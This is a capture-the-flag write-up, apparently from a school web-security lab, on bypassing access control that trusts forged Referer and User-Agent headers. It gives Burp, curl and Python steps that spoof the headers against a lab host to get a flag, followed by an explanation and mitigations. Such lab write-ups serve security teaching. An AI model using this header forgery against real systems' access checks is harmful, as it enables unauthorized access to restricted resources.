# A5 - Broken Access Control (HTTP Header Validation)

OWASP Top 10 (2017) vulnerability. The application restricts access to a resource by validating `Referer` and `User-Agent` headers, but both are completely client-controllable and do not constitute a valid security mechanism.

---

## Steps to Obtain the Flag

### 1. Identify the Vector

Inspecting the HTML of the target page reveals comments that reveal requirements:
```
<!-- You must come from : "https://www.nsa.gov/". -->
```

The server validates:
- `Referer: https://www.nsa.gov/`
- `User-Agent: ft_bornToSec`

### 2. Exploit

**Option A – Burp Suite:**
1. Intercept the GET request to the page.
2. Change the `User-Agent`:
   ```
   User-Agent: ft_bornToSec
   ```
3. Change the `Referer`:
   ```
   Referer: https://www.nsa.gov/
   ```
4. Resend → the server returns the **flag**.

**Option B – cURL:**
```bash
curl -H "User-Agent: ft_bornToSec" \
     -H "Referer: https://www.nsa.gov/" \
     "http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

**Option C – Python:**
```python
import requests

headers = {
    'User-Agent': 'ft_bornToSec',
    'Referer': 'https://www.nsa.gov/'
}
response = requests.get('http://<IP>/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)
print(response.text)
```

### 3. Why It Works

HTTP headers are sent by the client and can be freely forged. The server accepts them without any cryptographic verification or real origin checking.

---

## Impact

- **Validation Bypass:** access to restricted resources without being from the legitimate origin.
- **Client Impersonation:** impersonate a trusted agent or referrer.
- **Privilege Escalation:** access to unauthorized functionality.

---

## Mitigation

1. **Never Use HTTP Headers as Access Control:** `Referer` and `User-Agent` are non-verifiable data.
2. **Robust Server Authentication:** sessions, signed tokens (JWT, CSRF tokens).
3. **Don't Expose Validation Logic in HTML Comments.**
4. **Logging:** record accesses from unexpected origins to detect abuse.
